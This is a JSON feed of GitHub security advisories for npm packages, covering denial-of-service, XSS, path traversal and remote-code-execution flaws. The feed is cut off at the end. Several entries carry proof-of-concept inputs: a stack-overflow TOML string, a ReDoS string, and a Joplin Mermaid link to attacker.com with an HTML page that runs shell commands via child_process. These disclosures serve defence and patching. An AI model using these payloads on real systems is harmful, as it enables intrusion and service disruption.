{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker can send a maliciously crafted TOML to cause the parser to crash because of a stack overflow caused by a deeply nested inline structure. A similar problem occurs when attempting to stringify deeply nested objects.</p>\n<p>The library does not limit the maximum exploration depth while parsing or producing TOML documents, nor does it offer a way to do so.</p>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<pre><code class=\"language-js\">require(\"smol-toml\").parse(\"e=\" + \"{e=\".repeat(9999) + \"{}\" + \"}\".repeat(9999))\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Applications which parse arbitrary TOML documents may suffer availability issues if they receive malicious input. If uncaught, the crash may cause the application itself to crash. The impact is deemed minor, as the function is already likely to throw errors on invalid input and therefore to properly handle errors.</p>\n<p>Due to the design of most JavaScript runtimes, the uncontrolled recursion does not lead to excessive memory usage and the execution is quickly aborted.</p>\n<p>As a reminder, it is <strong>strongly</strong> advised when working with untrusted user input to expect errors to occur and to appropriately catch them.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Version 1.3.1 offers a mechanism to limit the exploration depth before halting with a <code>TomlError</code> when parsing, with a default cap of 1000. A same mechanism has been implemented for stringifying objects.</p>\n<p><strong>Please note that the parser will <em>still</em> throw an error upon such cases.</strong> It is, however, a now-controlled and documented behavior of the library.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Wrap all invocations of <code>parse</code> and <code>stringify</code> in a try/catch block.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/squirrelchat/smol-toml/security/advisories/GHSA-pqhp-25j4-6hq9\">https://github.com/squirrelchat/smol-toml/security/advisories/GHSA-pqhp-25j4-6hq9</a></li>\n<li><a href=\"https://github.com/squirrelchat/smol-toml/commit/405108ba090f0fc78f99aa2f0d6721e499b0ff27\">https://github.com/squirrelchat/smol-toml/commit/405108ba090f0fc78f99aa2f0d6721e499b0ff27</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pqhp-25j4-6hq9\">https://github.com/advisories/GHSA-pqhp-25j4-6hq9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pqhp-25j4-6hq9",
            "title": "[smol-toml] smol-toml has a Denial of Service via malicious TOML document using deeply nested inline tables",
            "date_modified": "2024-11-22T20:40:50.000Z",
            "date_published": "2024-11-22T20:40:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pqhp-25j4-6hq9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Flowise allows developers to inject configuration into the Chainflow during execution through the <code>overrideConfig</code> option. This is supported in both the frontend web integration and the backend Prediction API. </p>\n<p>This has a range of fundamental issues that are a <strong>major</strong> security vulnerability. \nWhile this feature is intentional, it should have strong protections added and be disabled by default. </p>\n<p>These issues include: </p>\n<ol>\n<li>Remote code execution. While inside a sandbox this allows for</li>\n<li>Sandbox escape </li>\n<li>DoS by crashing the server</li>\n<li>SSRF</li>\n<li>Prompt Injection, both System and User</li>\n<li>Full control over LLM prompts</li>\n<li>Server variable and data exfiltration\nAnd many many more such as altering the flow of a conversation, prompt exfiltration via LLM proxying etc.</li>\n</ol>\n<p>These issues are self-targeted and do not persist to other users but do leave the server and business exposed. \nAll issues are shown with the API but also work with the web embed.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li><code>overrideConfig</code> should be disabled by default</li>\n<li><code>overrideConfig</code> should have an explicit allow list of variables that are allowed to be modified. This way the user opts-in to where modifications can be made. </li>\n<li><code>vm2</code> and any forks of it should be removed as in the authors own words, \"fixing the vulnerability seems impossible\". The recommended replacement is <a href=\"https://www.npmjs.com/package/isolated-vm\">https://www.npmjs.com/package/isolated-vm</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5cph-wvm9-45gj\">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5cph-wvm9-45gj</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5cph-wvm9-45gj\">https://github.com/advisories/GHSA-5cph-wvm9-45gj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5cph-wvm9-45gj",
            "title": "[flowise] Flowise OverrideConfig security vulnerability",
            "date_modified": "2024-11-21T22:21:03.000Z",
            "date_published": "2024-11-21T22:21:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5cph-wvm9-45gj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security vulnerability has been discovered in bootstrap that could enable Cross-Site Scripting (XSS) attacks. The vulnerability is associated with the data-loading-text attribute within the button plugin. This vulnerability can be exploited by injecting malicious JavaScript code into the attribute, which would then be executed when the button's loading state is triggered.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6485\">https://nvd.nist.gov/vuln/detail/CVE-2024-6485</a></li>\n<li><a href=\"https://www.herodevs.com/vulnerability-directory/cve-2024-6485\">https://www.herodevs.com/vulnerability-directory/cve-2024-6485</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vxmc-5x29-h64v\">https://github.com/advisories/GHSA-vxmc-5x29-h64v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vxmc-5x29-h64v",
            "title": "[bootstrap] Bootstrap Cross-Site Scripting (XSS) vulnerability for data-* attributes",
            "date_modified": "2024-11-18T23:46:01.000Z",
            "date_published": "2024-07-11T18:31:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vxmc-5x29-h64v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21538\">https://nvd.nist.gov/vuln/detail/CVE-2024-21538</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/pull/160\">https://github.com/moxystudio/node-cross-spawn/pull/160</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff\">https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f\">https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230\">https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/issues/165\">https://github.com/moxystudio/node-cross-spawn/issues/165</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd\">https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349\">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3xgq-45jj-v275\">https://github.com/advisories/GHSA-3xgq-45jj-v275</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275",
            "title": "[cross-spawn] Regular Expression Denial of Service (ReDoS) in cross-spawn",
            "date_modified": "2024-11-19T16:19:50.000Z",
            "date_published": "2024-11-08T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21538\">https://nvd.nist.gov/vuln/detail/CVE-2024-21538</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/pull/160\">https://github.com/moxystudio/node-cross-spawn/pull/160</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff\">https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f\">https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230\">https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/issues/165\">https://github.com/moxystudio/node-cross-spawn/issues/165</a></li>\n<li><a href=\"https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd\">https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349\">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3xgq-45jj-v275\">https://github.com/advisories/GHSA-3xgq-45jj-v275</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275",
            "title": "[cross-spawn] Regular Expression Denial of Service (ReDoS) in cross-spawn",
            "date_modified": "2024-11-19T16:19:50.000Z",
            "date_published": "2024-11-08T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Firebase JavaScript SDK utilizes a \"FIREBASE_DEFAULTS\" cookie to store configuration data, including an \"_authTokenSyncURL\" field used for session synchronization.  If this cookie field is preset via an attacker by any other method, the attacker can manipulate the \"_authTokenSyncURL\" to point to their own server and it would allow am actor to capture user session data transmitted by the SDK. We recommend upgrading Firebase JS SDK at least to 10.9.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-11023\">https://nvd.nist.gov/vuln/detail/CVE-2024-11023</a></li>\n<li><a href=\"https://github.com/firebase/firebase-js-sdk/pull/8056\">https://github.com/firebase/firebase-js-sdk/pull/8056</a></li>\n<li><a href=\"https://firebase.google.com/support/release-notes/js#version_1090_-_march_14_2024\">https://firebase.google.com/support/release-notes/js#version_1090_-_march_14_2024</a></li>\n<li><a href=\"https://github.com/firebase/firebase-js-sdk/commit/245dd26e19b6c16aca7e1b7e597ed5784c2984ba\">https://github.com/firebase/firebase-js-sdk/commit/245dd26e19b6c16aca7e1b7e597ed5784c2984ba</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wf4-68gx-mph8\">https://github.com/advisories/GHSA-3wf4-68gx-mph8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wf4-68gx-mph8",
            "title": "[firebase] Firebase JavaScript SDK allows attackers to manipulate the \"_authTokenSyncURL\" to point to their own server",
            "date_modified": "2024-11-18T20:04:31.000Z",
            "date_published": "2024-11-18T12:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wf4-68gx-mph8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In NodeBB prior to 3.6.7 an attacker was able to access the restricted tabs for the Admin group which are only allowed the the administrators.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29316\">https://nvd.nist.gov/vuln/detail/CVE-2024-29316</a></li>\n<li><a href=\"https://medium.com/%40krityamkarma858041/broken-access-control-nodebb-v3-6-7-eebc59c24deb\">https://medium.com/%40krityamkarma858041/broken-access-control-nodebb-v3-6-7-eebc59c24deb</a></li>\n<li><a href=\"https://nodebb.org/bounty\">https://nodebb.org/bounty</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc99-r4wh-c8h6\">https://github.com/advisories/GHSA-qc99-r4wh-c8h6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc99-r4wh-c8h6",
            "title": "[nodebb] Incorrect Access Control in NodeBB",
            "date_modified": "2024-11-18T20:02:54.000Z",
            "date_published": "2024-03-29T00:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc99-r4wh-c8h6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Crafting a very large and well crafted string can increase the CPU usage and crash the program.</p>\n<h2 id=\"poc\">POC</h2>\n<pre><code class=\"language-js\">const { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nvar str = \"\";\nfor (var i = 0; i &lt; 1000000; i++) {\n  str += \" \";\n}\nstr += \"A\";\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseStringConfig(str, \"\"));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit` and `node attack.js` \n// then the program will stuck forever with high CPU usage\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/eslint/rewrite/security/advisories/GHSA-7q7g-4xm8-89cq\">https://github.com/eslint/rewrite/security/advisories/GHSA-7q7g-4xm8-89cq</a></li>\n<li><a href=\"https://github.com/eslint/rewrite/commit/071be842f0bd58de4863cdf2ab86d60f49912abf\">https://github.com/eslint/rewrite/commit/071be842f0bd58de4863cdf2ab86d60f49912abf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21539\">https://nvd.nist.gov/vuln/detail/CVE-2024-21539</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-ESLINTPLUGINKIT-8340627\">https://security.snyk.io/vuln/SNYK-JS-ESLINTPLUGINKIT-8340627</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7q7g-4xm8-89cq\">https://github.com/advisories/GHSA-7q7g-4xm8-89cq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7q7g-4xm8-89cq",
            "title": "[@eslint/plugin-kit] Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit",
            "date_modified": "2024-11-19T20:49:58.000Z",
            "date_published": "2024-11-15T20:47:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7q7g-4xm8-89cq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a vulnerability in <code>Joplin-desktop</code> that leads to remote code execution (RCE) when a user clicks on an <code>&lt;a&gt;</code> link within untrusted notes. The issue arises due to insufficient sanitization of <code>&lt;a&gt;</code> tag attributes introduced by the <code>Mermaid</code>. This vulnerability allows the execution of untrusted HTML content within the Electron window, which has full access to Node.js APIs, enabling arbitrary shell command execution.</p>\n<h3 id=\"details\">Details</h3>\n<p>In the markdown preview iframe, <code>Joplin</code> only opens <code>&lt;a&gt;</code> links internally within the same Electron window if they contain the <code>data-from-md</code> attribute. While Joplin successfully sanitizes the <code>data-from-md</code> attribute in user-embedded <code>&lt;a&gt;</code> links from the <code>.md</code> file to prevent the execution of untrusted HTML content, it fails to sanitize the <code>data-from-md</code> attributes of <code>&lt;a&gt;</code> tags introduced by <code>Mermaid</code> (e.g., the code snippet shown below). Since <code>Mermaid</code> allows the rendering of certain scriptless HTML elements, an attacker can embed <code>&lt;a&gt; </code>tags with <code>data-from-md</code> attributes, which will then be opened internally in the same Electron window.</p>\n<p>Additionally, <code>Joplin</code> opens the window with <code>nodeIntegration</code> set to <code>true</code> and <code>contextIsolation</code> set to <code>false</code>, resulting in any scripts running in the opened window having full access to Node.js APIs. Furthermore, the markdown preview iframe shares the same origin (i.e.,local file system) as its parent and lacks the <code>sandbox</code> attribute, allowing scripts running in the iframe to call Node.js APIs through <code>window.parent</code>. As a result, an attacker can execute arbitrary code using Node.js APIs by exploiting HTML files stored on the local file system, which share the same origin as the parent.</p>\n<p><strong>Relevant code references:</strong></p>\n<ul>\n<li>Payload to inject <code>&lt;a&gt;</code> with <code>data-from-md</code> attribute:</li>\n</ul>\n<pre><code class=\"language-markdown\">```mermaid\nflowchart TD\n    A[&lt;a href=\"https://attacker.com\" data-from-md&gt;hello&lt;/a&gt;]\n```\n</code></pre>\n<ul>\n<li>Handling link navigation in the markdown preview iframe</li>\n</ul>\n<p><a href=\"https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116\">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116</a></p>\n<ul>\n<li>Window configuration of <code>Joplin</code> window</li>\n</ul>\n<p><a href=\"https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155\">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Considering the user has downloaded the following shared files from the internet (Note: the threat model aligns with existing published security issues: <a href=\"https://github.com/laurent22/joplin/security/advisories/GHSA-2h88-m32f-qh5m\">GHSA-2h88-m32f-qh5m</a> and <a href=\"https://github.com/laurent22/joplin/security/advisories/GHSA-g8qx-5vcm-3x59\">GHSA-g8qx-5vcm-3x59</a>, where the malicious HTML file is available locally):</p>\n<ul>\n<li><code>poc.md</code></li>\n</ul>\n<pre><code class=\"language-markdown\">```mermaid\nflowchart TD\n    A[&lt;a href=\"/../../../../../../../../../../../../../../../path/to/poc2.html\" data-from-md&gt;hello&lt;/a&gt;]\n```\n</code></pre>\n<ul>\n<li><code>poc2.html</code></li>\n</ul>\n<pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      if (typeof window.parent.require !== 'undefined') {\n        const { exec } = window.parent.require('child_process');\n        exec('ls -al', (err, stdout, stderr) =&gt; {\n          if (err) {\n            document.body.innerText = `Error: ${err.message}`;\n            return;\n          }\n          if (stderr) {\n            document.body.innerText = `Stderr: ${stderr}`;\n            return;\n          }\n          document.body.innerText = stdout;\n        });\n      } else {\n        document.body.innerText = 'Require is not available in this environment.';\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>Then, open the <code>poc.md</code> with <code>Joplin</code> and click on the <code>hello</code> link. The code embedded in the <code>poc2.html</code> will be executed.</p>\n<p><img alt=\"result\" src=\"https://github.com/user-attachments/assets/e85fbad8-a348-49cd-af51-4fc302dd6a8f\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can lead to Remote Code Execution (RCE) when users open and interact with untrusted notes, while malicious HTML files are available locally.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7\">https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49362\">https://nvd.nist.gov/vuln/detail/CVE-2024-49362</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hff8-hjwv-j9q7\">https://github.com/advisories/GHSA-hff8-hjwv-j9q7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hff8-hjwv-j9q7",
            "title": "[joplin] Remote Code Execution on click of <a> Link in markdown preview",
            "date_modified": "2024-11-14T22:45:17.000Z",
            "date_published": "2024-11-14T17:38:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hff8-hjwv-j9q7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package dom-iterator are vulnerable to Arbitrary Code Execution due to use of the Function constructor without complete input sanitization. Function generates a new function body and thus care must be given to ensure that the inputs to Function are not attacker-controlled. The risks involved are similar to that of allowing attacker-controlled input to reach eval.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21541\">https://nvd.nist.gov/vuln/detail/CVE-2024-21541</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199\">https://security.snyk.io/vuln/SNYK-JS-DOMITERATOR-6157199</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jrvm-mcxc-mf6m\">https://github.com/advisories/GHSA-jrvm-mcxc-mf6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jrvm-mcxc-mf6m",
            "title": "[dom-iterator] dom-iterator code execution vulnerability",
            "date_modified": "2024-11-13T18:34:52.000Z",
            "date_published": "2024-11-13T06:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jrvm-mcxc-mf6m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>matrix-js-sdk before 34.11.0 is vulnerable to client-side path traversal via crafted MXC URIs. A malicious room member can trigger clients based on the matrix-js-sdk to issue arbitrary authenticated GET requests to the client's homeserver.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Matrix specification demands homeservers to <a href=\"https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5\">perform validation</a> of the <code>server-name</code> and <code>media-id</code> components of MXC URIs with the intent to prevent path traversal. However, it is not mentioned that a similar check must also be performed on the client to prevent <em>client-side</em> path traversal. matrix-js-sdk fails to perform this validation.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in matrix-js-sdk 34.11.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5\">https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5</a></li>\n<li><a href=\"https://blog.doyensec.com/2024/07/02/cspt2csrf.html\">https://blog.doyensec.com/2024/07/02/cspt2csrf.html</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-xvg8-m4x3-w6xr\">https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-xvg8-m4x3-w6xr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50336\">https://nvd.nist.gov/vuln/detail/CVE-2024-50336</a></li>\n<li><a href=\"https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5\">https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvg8-m4x3-w6xr\">https://github.com/advisories/GHSA-xvg8-m4x3-w6xr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xvg8-m4x3-w6xr",
            "title": "[matrix-js-sdk] matrix-js-sdk has insufficient MXC URI validation which allows client-side path traversal",
            "date_modified": "2024-11-12T19:54:40.000Z",
            "date_published": "2024-11-12T19:54:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xvg8-m4x3-w6xr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package jsonpath-plus before 10.0.7 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of vm in Node.</p>\n<p><strong>Note:</strong></p>\n<p>There was an attempt to fix it in version <a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3\">10.0.0</a> but it could still be exploited using <a href=\"https://github.com/JSONPath-Plus/JSONPath/issues/226\">different payloads</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21534\">https://nvd.nist.gov/vuln/detail/CVE-2024-21534</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3\">https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884\">https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019\">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/issues/226\">https://github.com/JSONPath-Plus/JSONPath/issues/226</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72\">https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316\">https://github.com/JSONPath-Plus/JSONPath/issues/226#issuecomment-2424230316</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0\">https://github.com/JSONPath-Plus/JSONPath/compare/v9.0.0...v10.1.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pppg-cpfq-h7wr\">https://github.com/advisories/GHSA-pppg-cpfq-h7wr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pppg-cpfq-h7wr",
            "title": "[jsonpath-plus] JSONPath Plus Remote Code Execution (RCE) Vulnerability",
            "date_modified": "2024-11-18T18:32:11.000Z",
            "date_published": "2024-10-11T15:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pppg-cpfq-h7wr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Consumers of the NPM package <code>happy-dom</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The security vulnerability has been patched in v15.10.2</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No easy workarounds to my knowledge</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/capricorn86/happy-dom/issues/1585\">#1585</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/capricorn86/happy-dom/security/advisories/GHSA-96g7-g7g9-jxw8\">https://github.com/capricorn86/happy-dom/security/advisories/GHSA-96g7-g7g9-jxw8</a></li>\n<li><a href=\"https://github.com/capricorn86/happy-dom/issues/1585\">https://github.com/capricorn86/happy-dom/issues/1585</a></li>\n<li><a href=\"https://github.com/capricorn86/happy-dom/pull/1586\">https://github.com/capricorn86/happy-dom/pull/1586</a></li>\n<li><a href=\"https://github.com/capricorn86/happy-dom/commit/5ee0b1676d4ce20cc2a70d1c9c8d6f1e3f57efac\">https://github.com/capricorn86/happy-dom/commit/5ee0b1676d4ce20cc2a70d1c9c8d6f1e3f57efac</a></li>\n<li><a href=\"https://github.com/capricorn86/happy-dom/commit/d23834c232f1cf5519c9418b073f1dcec6b2f0fd\">https://github.com/capricorn86/happy-dom/commit/d23834c232f1cf5519c9418b073f1dcec6b2f0fd</a></li>\n<li><a href=\"https://github.com/capricorn86/happy-dom/releases/tag/v15.10.2\">https://github.com/capricorn86/happy-dom/releases/tag/v15.10.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51757\">https://nvd.nist.gov/vuln/detail/CVE-2024-51757</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-96g7-g7g9-jxw8\">https://github.com/advisories/GHSA-96g7-g7g9-jxw8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-96g7-g7g9-jxw8",
            "title": "[happy-dom] happy-dom allows for server side code to be executed by a <script> tag",
            "date_modified": "2024-11-06T23:39:30.000Z",
            "date_published": "2024-11-06T15:27:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-96g7-g7g9-jxw8"
            },
            "tags": [
                "severity"
            ]
        },
        {
